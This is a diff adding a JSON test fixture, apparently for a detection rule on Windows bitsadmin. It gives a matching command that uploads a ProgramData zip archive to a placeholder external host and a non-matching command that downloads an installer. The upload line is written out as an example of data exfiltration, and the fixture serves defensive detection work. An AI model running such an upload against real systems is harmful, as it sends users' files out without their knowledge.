@@ -1,0 +1,10 @@
+{
+  "matching": {
+    "image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "cmdline": "bitsadmin.exe /transfer support /upload https://upload.example.test/diag C:\\ProgramData\\support.zip"
+  },
+  "non_matching": {
+    "image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "cmdline": "bitsadmin.exe /transfer updates /download https://updates.example.test/agent.msi C:\\Windows\\Temp\\agent.msi"
+  }
+}
